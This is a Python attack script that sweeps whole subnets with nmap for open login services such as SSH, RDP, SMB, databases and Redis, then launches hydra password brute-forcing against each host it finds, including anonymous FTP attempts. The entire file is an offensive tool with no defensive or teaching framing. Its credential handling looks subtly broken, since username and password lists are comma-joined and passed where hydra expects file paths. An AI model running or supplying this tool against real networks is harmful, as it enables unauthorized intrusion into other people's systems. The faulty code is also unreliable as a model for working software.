import subprocess
import sys
import argparse

def scan_subnets(subnet_list, service):
    open_hosts = []
    port_mapping = {
        'ssh': '22',
        'ftp': '21',
        'rdp': '3389',
        'smb': '445',
        'http': '80',
        'https': '443',
        'mysql': '3306',
        'postgresql': '5432',
        'telnet': '23',
        'vnc': '5900',
        'mssql': '1433',
        'redis': '6379'
    }

    if service not in port_mapping:
        print("Invalid service. Choose from: ssh, ftp, rdp, smb, http, https, mysql, postgresql, telnet, vnc, mssql, redis.")
        sys.exit(1)

    port = port_mapping[service]
    
    for subnet in subnet_list:
        print(f"Scanning {subnet} for open {service} ports...")
        result = subprocess.run(['nmap', '-p', port, '--open', '-oG', '-', subnet],
                                capture_output=True, text=True)

        for line in result.stdout.splitlines():
            if f'{port}/open' in line:
                parts = line.split()
                ip = parts[1]
                open_hosts.append(ip)

    return open_hosts

def run_hydra(open_hosts, usernames, passwords, service):
    for host in open_hosts:
        print(f"Bruteforcing {host} with {service}...")
        command = ['hydra', '-t', '4']

        if isinstance(usernames, list):
            command += ['-L', ','.join(usernames)]
        else:
            command += ['-L', usernames]

        if isinstance(passwords, list):
            command += ['-P', ','.join(passwords)]
        else:
            command += ['-P', passwords]

        if service == 'ftp':
            command += ['-e', 'n']  # Try anonymous FTP
        
        command += [f'{service}://{host}']
        
        subprocess.run(command)

def main():
    parser = argparse.ArgumentParser(description="Scan subnets and brute force services.")
    parser.add_argument('-s', '--subnet', help="File or single subnet (e.g. 192.168.1.0/24)")
    parser.add_argument('-u', '--username', help="File or single username")
    parser.add_argument('-p', '--password', help="File or single password")
    parser.add_argument('-S', '--service', required=True, help="Service to brute force (ssh, ftp, rdp, smb, http, https, mysql, postgresql, telnet, vnc, mssql, redis)")

    args = parser.parse_args()

    # Handle subnets
    subnet_list = []
    if args.subnet:
        if args.subnet.endswith('.txt'):
            with open(args.subnet) as f:
                subnet_list = [line.strip() for line in f if line.strip()]
        else:
            subnet_list.append(args.subnet)

    # Handle usernames
    if args.username:
        if args.username.endswith('.txt'):
            with open(args.username) as f:
                usernames = [line.strip() for line in f if line.strip()]
        else:
            usernames = [args.username]
    else:
        usernames = []

    # Handle passwords
    if args.password:
        if args.password.endswith('.txt'):
            with open(args.password) as f:
                passwords = [line.strip() for line in f if line.strip()]
        else:
            passwords = [args.password]
    else:
        passwords = []

    open_hosts = scan_subnets(subnet_list, args.service)

    if open_hosts:
        run_hydra(open_hosts, usernames, passwords, args.service)
    else:
        print(f"No hosts found with open port for {args.service}.")

if __name__ == '__main__':
    main()
